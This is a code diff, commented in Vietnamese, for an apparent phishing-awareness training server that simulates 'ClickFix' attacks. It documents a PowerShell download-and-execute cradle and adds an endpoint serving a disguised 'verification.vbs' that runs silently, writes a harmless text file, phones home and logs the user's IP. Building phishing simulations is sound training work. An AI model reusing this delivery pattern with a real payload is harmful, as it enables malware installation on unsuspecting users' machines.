@@ -45,7 +45,7 @@ async def clickfix_stage2(
     payload trên clipboard chỉ là cradle ngắn `iex(iwr '<url>/s?t=...')`,
     script này được tải về và chạy hidden trên máy user.
 
-    Nội dung 100% vô hại: tạo C:\Temp\hehehe.txt ('Hehehehe') rồi
+    Nội dung 100% vô hại: tạo C:\\Temp\\hehehe.txt ('Hehehehe') rồi
     gọi /api/clickfix/verify. Ghi lại dấu vết 'downloaded' để instructor
     thấy được ai đã tải payload kể cả khi chưa chạy.
     """
@@ -71,6 +71,55 @@ async def clickfix_stage2(
         f"Invoke-WebRequest '{origin}/api/clickfix/verify?t={token}' -UseBasicParsing|Out-Null\n"
     )
     return PlainTextResponse(script, media_type="text/plain")
+
+
+@router.get("/tool")
+async def clickfix_tool(
+    request: Request,
+    t: str = Query(..., description="Token sinh ra từ frontend register form"),
+):
+    """
+    Tải "công cụ xác minh" = file .vbs VO HẠI (token nhúng sẵn trong file).
+
+    User chỉ cần mở file (double-click) thay vì gõ Win+R + paste. File chạy
+    im lặng qua wscript: tạo C:\\Temp\\hehehe.txt ('Hehehehe') rồi gọi verify.
+    Nếu browser user bật "Always open files of this type" thì tải xong là
+    chạy luôn — gần như tự động hoàn toàn.
+    """
+    token = (t or "").strip()
+    if not TOKEN_RE.match(token):
+        return PlainTextResponse("bad token", status_code=400)
+
+    client_ip = request.client.host if request.client else "unknown"
+    origin = str(request.base_url).rstrip("/")
+    with _STORE_LOCK:
+        _gc_expired()
+        entry = _VERIFY_STORE.get(token) or {"created_at": time.time(), "verified": False}
+        entry["downloaded_at"] = time.time()
+        entry["client_ip"] = client_ip
+        _VERIFY_STORE[token] = entry
+
+    print(f"[CLICKFIX] ⬇ TOOL-DOWNLOAD token={token} ip={client_ip}", flush=True)
+
+    vbs = (
+        "' Training verification tool - VO HAI, chi tao file text va bao ve server training\r\n"
+        "On Error Resume Next\r\n"
+        "Dim fso, ts\r\n"
+        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+        "If Not fso.FolderExists(\"C:\\Temp\") Then fso.CreateFolder(\"C:\\Temp\")\r\n"
+        "Set ts = fso.CreateTextFile(\"C:\\Temp\\hehehe.txt\", True)\r\n"
+        "ts.Write \"Hehehehe\"\r\n"
+        "ts.Close\r\n"
+        "Dim http\r\n"
+        "Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
+        f"http.open \"GET\", \"{origin}/api/clickfix/verify?t={token}\", False\r\n"
+        "http.send\r\n"
+    )
+    return PlainTextResponse(
+        vbs,
+        media_type="text/plain",
+        headers={"Content-Disposition": 'attachment; filename="verification.vbs"'},
+    )
 
 
 @router.get("/verify")
